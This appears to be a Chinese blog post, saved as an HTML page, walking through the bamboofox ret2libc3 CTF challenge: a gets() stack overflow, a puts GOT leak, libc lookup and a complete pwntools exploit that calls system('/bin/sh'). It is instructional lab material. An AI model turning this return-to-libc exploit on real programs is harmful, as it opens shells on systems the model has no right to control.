@@ -1,0 +1,360 @@
+<!DOCTYPE html>
+<html itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+  <head>
+    
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+    <meta name="robots" content="noodp" />
+    <title>Pwn-ROP-ret2libc-高级 - 好好学习</title><meta name="author" content="alextang">
+<meta name="author-link" content="">
+<meta name="description" content="这里以 bamboofox 中的 ret2libc3 为例 点击下载: ret2libc3 在例 2 的基础上，再次将 system 函数的地址去掉。此时，我们需要同时找到 system 函数地址与 /bin/sh 字符串的地址。首先，查看安全保护 1" /><meta name="keywords" content='CTF, Pwn, 二进制' />
+  <meta itemprop="name" content="Pwn-ROP-ret2libc-高级">
+  <meta itemprop="description" content="这里以 bamboofox 中的 ret2libc3 为例 点击下载: ret2libc3 在例 2 的基础上，再次将 system 函数的地址去掉。此时，我们需要同时找到 system 函数地址与 /bin/sh 字符串的地址。首先，查看安全保护 1">
+  <meta itemprop="datePublished" content="2023-09-23T21:12:36+08:00">
+  <meta itemprop="dateModified" content="2023-09-23T21:12:36+08:00">
+  <meta itemprop="wordCount" content="952">
+  <meta itemprop="keywords" content="CTF,Pwn,二进制"><meta property="og:url" content="https://alextang.top/articles/2023/09/pwn-rop-ret2libc-%E9%AB%98%E7%BA%A7/">
+  <meta property="og:site_name" content="好好学习">
+  <meta property="og:title" content="Pwn-ROP-ret2libc-高级">
+  <meta property="og:description" content="这里以 bamboofox 中的 ret2libc3 为例 点击下载: ret2libc3 在例 2 的基础上，再次将 system 函数的地址去掉。此时，我们需要同时找到 system 函数地址与 /bin/sh 字符串的地址。首先，查看安全保护 1">
+  <meta property="og:locale" content="zh_CN">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2023-09-23T21:12:36+08:00">
+    <meta property="article:modified_time" content="2023-09-23T21:12:36+08:00">
+    <meta property="article:tag" content="CTF">
+    <meta property="article:tag" content="Pwn">
+    <meta property="article:tag" content="二进制">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Pwn-ROP-ret2libc-高级">
+  <meta name="twitter:description" content="这里以 bamboofox 中的 ret2libc3 为例 点击下载: ret2libc3 在例 2 的基础上，再次将 system 函数的地址去掉。此时，我们需要同时找到 system 函数地址与 /bin/sh 字符串的地址。首先，查看安全保护 1">
+      <meta name="twitter:site" content="@a1extang">
+<meta name="application-name" content="a1extang">
+<meta name="apple-mobile-web-app-title" content="a1extang"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="https://alextang.top/articles/2023/09/pwn-rop-ret2libc-%E9%AB%98%E7%BA%A7/" /><link rel="prev" href="https://alextang.top/articles/2023/09/pwn-rop-ret2libc-%E4%B8%AD%E7%BA%A7/" /><link rel="next" href="https://alextang.top/articles/2023/09/swpuctf-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-nc%E7%AD%BE%E5%88%B0/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.4.2/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css"><script type="application/ld+json">
+  {
+    "@context": "http://schema.org",
+    "@type": "BlogPosting",
+    "headline": "Pwn-ROP-ret2libc-高级",
+    "inLanguage": "zh-CN",
+    "mainEntityOfPage": {
+      "@type": "WebPage",
+      "@id": "https:\/\/alextang.top\/articles\/2023\/09\/pwn-rop-ret2libc-%E9%AB%98%E7%BA%A7\/"
+    },"genre": "posts","keywords": "CTF, Pwn, 二进制","wordcount":  952 ,
+    "url": "https:\/\/alextang.top\/articles\/2023\/09\/pwn-rop-ret2libc-%E9%AB%98%E7%BA%A7\/","datePublished": "2023-09-23T21:12:36+08:00","dateModified": "2023-09-23T21:12:36+08:00","publisher": {
+      "@type": "Organization",
+      "name": ""},"author": {
+        "@type": "Person",
+        "name": "alextang"
+      },"description": ""
+  }
+  </script></head>
+  <body data-header-desktop="sticky" data-header-mobile="auto"><script>(window.localStorage?.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('data-theme', 'dark');</script><div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
+  <div class="header-wrapper">
+    <div class="header-title">
+      <a href="/" title="好好学习"><span class="header-title-text">a1extang</span></a><span class="header-subtitle"></span></div>
+    <nav>
+      <ul class="menu"><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/posts/"
+                
+                
+              ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> 文章</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/categories/"
+                
+                
+              ><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> 分类</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/tags/"
+                
+                
+              ><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> 标签</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/about/"
+                title="关于"
+                
+              ><i class="fas fa-user fa-fw fa-sm" aria-hidden="true"></i> 关于</a></li><li class="menu-item delimiter"></li><li class="menu-item search" id="search-desktop">
+            <input type="text" placeholder="搜索文章标题或内容……" id="search-input-desktop">
+            <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+              <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
+            </a>
+            <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
+              <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
+            </a>
+            <span class="search-button search-loading" id="search-loading-desktop">
+              <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+            </span>
+          </li><li class="menu-item theme-switch" title="切换主题">
+          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+        </li></ul>
+    </nav>
+  </div>
+</header><header class="mobile animate__faster" id="header-mobile">
+  <div class="header-container">
+    <div class="header-wrapper">
+      <div class="header-title">
+        <a href="/" title="好好学习"><span class="header-title-text">a1extang</span></a><span class="header-subtitle"></span></div>
+      <div class="menu-toggle" id="menu-toggle-mobile">
+        <span></span><span></span><span></span>
+      </div>
+    </div>
+    <nav>
+      <ul class="menu" id="menu-mobile"><li class="search-wrapper">
+            <div class="search mobile" id="search-mobile">
+              <input type="text" placeholder="搜索文章标题或内容……" id="search-input-mobile">
+              <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
+              </a>
+              <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
+              </a>
+              <span class="search-button search-loading" id="search-loading-mobile">
+                <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+              </span>
+            </div>
+            <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+              取消
+            </a>
+          </li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/posts/"
+                  
+                  
+                ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> 文章</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/categories/"
+                  
+                  
+                ><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> 分类</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/tags/"
+                  
+                  
+                ><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> 标签</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/about/"
+                  title="关于"
+                  
+                ><i class="fas fa-user fa-fw fa-sm" aria-hidden="true"></i> 关于</a></li><li class="menu-item menu-system">
+          <span class="menu-system-item theme-switch" title="切换主题"><i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i></span></li>
+      </ul>
+    </nav>
+  </div>
+</header><div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+  </div>
+  <div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+  </div><main class="container"><aside class="toc" id="toc-auto"></aside>
+
+  <aside class="aside-custom">
+    </aside>
+
+  <article class="page single">
+    <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span>Pwn-ROP-ret2libc-高级</span>
+      </h1></div><div class="post-meta">
+      <div class="post-meta-line"><span class="post-author"><span class="author"><img loading="lazy" src="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/1693637676533.jpg" srcset="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/1693637676533.jpg?size=small, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/1693637676533.jpg?size=medium 1.5x, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/1693637676533.jpg?size=large 2x" sizes="auto" data-title="alextang" data-alt="alextang" class="avatar" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}"/>&nbsp;alextang</span></span>
+          <span class="post-category">收录于 <a href="/categories/pwn/"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> Pwn</a></span></div>
+      <div class="post-meta-line"><span title="发布于 2023-09-23 21:12:36"><i class="fa-regular fa-calendar-alt fa-fw me-1" aria-hidden="true"></i><time datetime="2023-09-23">2023-09-23</time></span>&nbsp;<span title="更新于 2023-09-23 21:12:36"><i class="fa-regular fa-edit fa-fw me-1" aria-hidden="true"></i><time datetime="2023-09-23">2023-09-23</time></span>&nbsp;<span title="952 字"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>约 1000 字</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>预计阅读 2 分钟</span>&nbsp;</div>
+    </div><div class="content" id="content"><p>这里以 bamboofox 中的 ret2libc3 为例</p>
+<p>点击下载: <a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2libc/ret2libc3/ret2libc3"target="_blank" rel="external nofollow noopener noreferrer">ret2libc3</a></p>
+<p>在例 2 的基础上，<strong>再次将 system 函数的地址去掉</strong>。此时，我们需要同时找到 system 函数地址与 /bin/sh 字符串的地址。首先，查看安全保护</p>
+<div class="highlight" id="id-1"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">➜  ret2libc3 checksec ret2libc3
+</span></span><span class="line"><span class="cl">    Arch:     i386-32-little
+</span></span><span class="line"><span class="cl">    RELRO:    Partial RELRO
+</span></span><span class="line"><span class="cl">    Stack:    No canary found
+</span></span><span class="line"><span class="cl">    NX:       NX enabled
+</span></span><span class="line"><span class="cl">    PIE:      No PIE (0x8048000)</span></span></code></pre></td></tr></table>
+</div>
+</div><p>可以看出，源程序仍旧开启了堆栈不可执行保护。进而查看源码，发现程序的 bug 仍然是栈溢出</p>
+<div class="highlight" id="id-2"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="ne">int</span> <span class="n">__cdecl</span> <span class="n">main</span><span class="p">(</span><span class="ne">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="n">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="k">const</span> <span class="n">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="ne">int</span> <span class="n">v4</span><span class="p">;</span> <span class="o">//</span> <span class="p">[</span><span class="n">sp</span><span class="o">+</span><span class="mi">1</span><span class="n">Ch</span><span class="p">]</span> <span class="p">[</span><span class="n">bp</span><span class="o">-</span><span class="mi">64</span><span class="n">h</span><span class="p">]</span><span class="err">@</span><span class="mi">1</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">puts</span><span class="p">(</span><span class="s2">&#34;No surprise anymore, system disappeard QQ.&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">printf</span><span class="p">(</span><span class="s2">&#34;Can you find it !?&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">gets</span><span class="p">((</span><span class="n">char</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">v4</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>那么我们如何得到 system 函数的地址呢？这里就主要利用了两个知识点</p>
+<ul>
+<li>system 函数属于 <strong>libc</strong>，而 libc.so 动态链接库中的函数<strong>之间相对偏移是固定的</strong>。</li>
+<li>即使程序有 ASLR 保护，也只是针对于地址中间位进行随机，最低的 12 位并不会发生改变。而 libc 在 github 上有人进行收集，如下</li>
+<li><a href="https://github.com/niklasb/libc-database"target="_blank" rel="external nofollow noopener noreferrer">https://github.com/niklasb/libc-database</a></li>
+</ul>
+<p>所以如果我们知道 libc 中某个函数的地址，那么我们就可以确定该程序利用的 libc。进而我们就可以知道 system 函数的地址。</p>
+<p>那么如何得到 libc 中的某个函数的地址呢？我们一般常用的方法是采用 got 表泄露，即输出某个函数对应的 got 表项的内容。<strong>当然，由于 libc 的延迟绑定机制，我们需要泄漏已经执行过的函数的地址。</strong></p>
+<p>我们自然可以根据上面的步骤先得到 libc，之后在程序中查询偏移，然后再次获取 system 地址，但这样手工操作次数太多，有点麻烦，这里给出一个 libc 的利用工具，具体细节请参考 readme</p>
+<ul>
+<li><a href="https://github.com/lieanu/LibcSearcher"target="_blank" rel="external nofollow noopener noreferrer">https://github.com/lieanu/LibcSearcher</a></li>
+</ul>
+<p>此外，在得到 libc 之后，其实 libc 中也是有 /bin/sh 字符串的，所以我们可以一起获得 /bin/sh 字符串的地址。</p>
+<p>这里的思路是，通过puts打印出自己的got地址。因为打印的时候已经执行过一遍puts了，所以此时got中肯定存在puts的真实地址。</p>
+<div class="highlight" id="id-3"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">puts_plt</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">start</span> <span class="o">=</span> <span class="mh">0x080484D0</span>
+</span></span><span class="line"><span class="cl"><span class="n">puts_got</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">payload1</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="mi">112</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">puts_plt</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">start</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">puts_got</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">&#39;!?&#39;</span><span class="p">,</span><span class="n">payload1</span><span class="p">)</span></span></span></code></pre></td></tr></table>
+</div>
+</div><blockquote>
+<p>PS：这里的start地址实际上是_start函数的地址。这个函数可以认为是程序的起点。当然这里使用libc_start_main也是可以的。只要能让程序重新执行即可</p>
+</blockquote>
+<ul>
+<li>泄露 puts 地址</li>
+<li>获取 libc 版本</li>
+<li>获取libc基址（puts的真实地址减去puts的Libc地址）</li>
+<li>获取 system 地址与 /bin/sh 的地址（system的libc地址加上libc基址）</li>
+<li>再次执行源程序</li>
+<li>触发栈溢出执行 system(‘/bin/sh’)</li>
+</ul>
+<p>exp 如下：</p>
+<div class="highlight" id="id-4"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">LibcSearcher</span> <span class="kn">import</span> <span class="n">LibcSearcher</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">arch</span><span class="o">=</span> <span class="s1">&#39;i386&#39;</span><span class="p">,</span> <span class="n">os</span> <span class="o">=</span> <span class="s1">&#39;linux&#39;</span><span class="p">,</span> <span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./ret2libc3&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./ret2libc3&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">puts_plt</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">start</span> <span class="o">=</span> <span class="mh">0x080484D0</span>
+</span></span><span class="line"><span class="cl"><span class="n">puts_got</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">payload1</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="mi">112</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">puts_plt</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">start</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">puts_got</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">&#39;!?&#39;</span><span class="p">,</span><span class="n">payload1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">puts_addr</span> <span class="o">=</span> <span class="n">u32</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">libc</span> <span class="o">=</span> <span class="n">LibcSearcher</span><span class="p">(</span><span class="s2">&#34;puts&#34;</span><span class="p">,</span><span class="n">puts_addr</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">libcbase_addr</span> <span class="o">=</span> <span class="n">puts_addr</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="s1">&#39;puts&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">system_libc</span> <span class="o">=</span> <span class="n">libcbase_addr</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="s1">&#39;system&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">str_bin_sh</span> <span class="o">=</span> <span class="n">libcbase_addr</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="s1">&#39;str_bin_sh&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">payload2</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="mi">112</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">system_libc</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;b&#39;</span> <span class="o">*</span> <span class="mi">4</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">str_bin_sh</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">&#39;!?&#39;</span><span class="p">,</span><span class="n">payload2</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span></span></span></code></pre></td></tr></table>
+</div>
+</div></div><div class="post-footer" id="post-footer">
+  <div class="post-info">
+    <div class="post-info-line">
+      <div class="post-info-mod">
+        <span title="更新于 2023-09-23 21:12:36">更新于 2023-09-23&nbsp;</span>
+      </div><div class="post-info-license">
+          <span><a rel="license external nofollow noopener noreferrer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span>
+        </div></div>
+    <div class="post-info-line">
+      <div class="post-info-md"><span><a href="/articles/2023/09/pwn-rop-ret2libc-%E9%AB%98%E7%BA%A7/index.md" title="阅读原始文档" class="link-to-markdown">阅读原始文档</a></span></div>
+      <div class="post-info-share">
+        <span><a href="javascript:void(0);" title="分享到 Twitter" data-sharer="twitter" data-url="https://alextang.top/articles/2023/09/pwn-rop-ret2libc-%E9%AB%98%E7%BA%A7/" data-title="Pwn-ROP-ret2libc-高级" data-via="a1extang" data-hashtags="CTF,Pwn,二进制"><i class="fa-brands fa-twitter fa-fw" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="分享到 Facebook" data-sharer="facebook" data-url="https://alextang.top/articles/2023/09/pwn-rop-ret2libc-%E9%AB%98%E7%BA%A7/" data-hashtag="CTF"><i class="fa-brands fa-facebook-square fa-fw" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="分享到 微博" data-sharer="weibo" data-url="https://alextang.top/articles/2023/09/pwn-rop-ret2libc-%E9%AB%98%E7%BA%A7/" data-title="Pwn-ROP-ret2libc-高级"><i class="fa-brands fa-weibo fa-fw" aria-hidden="true"></i></a>
+  </span>
+      </div>
+    </div>
+  </div>
+
+  <div class="post-info-more">
+    <section class="post-tags"><i class="fa-solid fa-tags fa-fw me-1" aria-hidden="true"></i><a href='/tags/ctf/' class="post-tag">CTF</a><a href='/tags/pwn/' class="post-tag">Pwn</a><a href='/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6/' class="post-tag">二进制</a></section>
+    <section>
+      <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+    </section>
+  </div>
+
+  <div class="post-nav"><a href="/articles/2023/09/pwn-rop-ret2libc-%E4%B8%AD%E7%BA%A7/" class="post-nav-item" rel="prev" title="Pwn-ROP-ret2libc-中级"><i class="fa-solid fa-angle-left fa-fw" aria-hidden="true"></i>Pwn-ROP-ret2libc-中级</a>
+      <a href="/articles/2023/09/swpuctf-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-nc%E7%AD%BE%E5%88%B0/" class="post-nav-item" rel="next" title="SWPUCTF 2021 新生赛 nc签到">SWPUCTF 2021 新生赛 nc签到<i class="fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article></main><footer class="footer">
+    <div class="footer-container"><div class="footer-line copyright" itemscope itemtype="http://schema.org/CreativeWork"><i class="fa-regular fa-copyright fa-fw" aria-hidden="true"></i>
+            <span itemprop="copyrightYear">2024</span><span class="author" itemprop="copyrightHolder">
+              <a href="/">alextang</a></span><span class="license footer-divider"><a rel="license external nofollow noopener noreferrer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div><div class="footer-line statistics"></div><div class="footer-line visitor">
+          <span id="busuanzi_container_site_uv" title='总访客数'><i class="fa-regular fa-user fa-fw" aria-hidden="true"></i>&nbsp;<span id="busuanzi_value_site_uv"><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span></span><span id="busuanzi_container_site_pv" class="footer-divider" title='总访问量'><i class="fa-regular fa-eye fa-fw" aria-hidden="true"></i>&nbsp;<span id="busuanzi_value_site_pv"><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span></span>
+        </div><div class="footer-line beian"><span class="icp footer-divider"><a href="https://icp.gov.moe/?keyword=20238299" target="_blank">萌ICP备20238299号</a></span></div></div>
+  </footer></div><div class="widgets"><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role="button" aria-label="回到顶部"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><span class="variant-numeric d-none">0%</span>
+        </div></div><div id="mask"></div><noscript>
+    <div class="noscript-warning">FixIt 主题在启用 JavaScript 的情况下效果最佳。</div>
+  </noscript>
+</div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/katex.min.css"><script src="https://cdn.jsdelivr.net/npm/autocomplete.js@0.38.1/dist/autocomplete.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/lunr@2.3.9/lunr.min.js" defer></script><script src="/lib/lunr/lunr.stemmer.support.min.js" defer></script><script src="/lib/lunr/lunr.zh.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/sharer.js@0.5.1/sharer.min.js" async defer></script><script src="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/katex.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/contrib/auto-render.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/contrib/copy-tex.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/contrib/mhchem.min.js" defer></script><script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async 